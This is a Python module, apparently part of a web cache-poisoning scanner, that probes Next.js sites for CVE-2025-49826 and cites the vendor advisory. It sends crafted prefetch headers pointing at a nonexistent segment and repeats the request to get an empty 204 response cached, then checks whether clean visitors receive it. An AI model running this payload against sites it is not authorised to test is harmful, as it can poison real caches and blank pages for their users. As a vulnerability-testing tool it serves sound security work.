#!/usr/bin/env python3

"""
https://x.com/zhero___/status/1941593504901173250
https://github.com/vercel/next.js/security/advisories/GHSA-67rr-84xm-4c7r
Thanks Wlayzz for the PoC !
"""


from modules.cp_cve.unrisk_page import get_unrisk_page
from utils.style import Colors, Identify
from utils.utils import configure_logger, random, requests, sys

logger = configure_logger(__name__)


def valid_cache(
    uri: str, req: requests.Response, req_h: requests.Response, headers: dict
) -> None:
    for _ in range(5):
        req_verify = requests.get(
            uri, headers=headers, verify=False, allow_redirects=False, timeout=10
        )
    req_confirm = requests.get(uri, verify=False, allow_redirects=False, timeout=10)
    if (
        req_confirm.status_code == req_verify.status_code
        and req_confirm.status_code != req.status_code
        and req_confirm.status_code == 204
    ):
        print(
            f" {Identify.confirmed} | CVE-2025-49826 | {Colors.BLUE}{uri}{Colors.RESET} | {req.status_code} > {req_h.status_code} | PAYLOAD: {headers}"
        )
    elif (
        req_confirm.status_code == req_verify.status_code
        and req_confirm.status_code != req.status_code
    ):
        print(
            f" {Identify.behavior} ++ | CVE-2025-49826 | {Colors.BLUE}{uri}{Colors.RESET} | {req.status_code} > {req_h.status_code} | PAYLOAD: {headers}"
        )
    else:
        print(
            f" {Identify.behavior} | CVE-2025-49826 | {Colors.BLUE}{uri}{Colors.RESET} | {req.status_code} > {req_h.status_code} | PAYLOAD: {headers} "
        )


def nextjs_204(url: str, s: requests.Session) -> None:
    url = f"{url}?cve={random.randrange(99)}"

    headers = {
        "User-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
        "Rsc": "1",
        "Next-Router-Prefetch": "1",
        "Next-Router-Segment-Prefetch": "/nonexistent_segment",
    }
    try:
        req = s.get(url, verify=False, allow_redirects=False, timeout=10)
        unrisk_page = get_unrisk_page(url, s, req)
        if unrisk_page:
            uri = f"{unrisk_page}?cve={random.randrange(999)}"
            req_h = s.get(
                uri, headers=headers, verify=False, allow_redirects=False, timeout=10
            )
            if req.status_code != req_h.status_code and req.status_code not in [
                403,
                429,
            ]:
                valid_cache(uri, req, req_h, headers)
    except requests.Timeout as t:
        logger.error(f"Timeout Error: {t}")
    except KeyboardInterrupt:
        print("Exiting")
        sys.exit()
    except Exception as e:
        logger.exception(e)
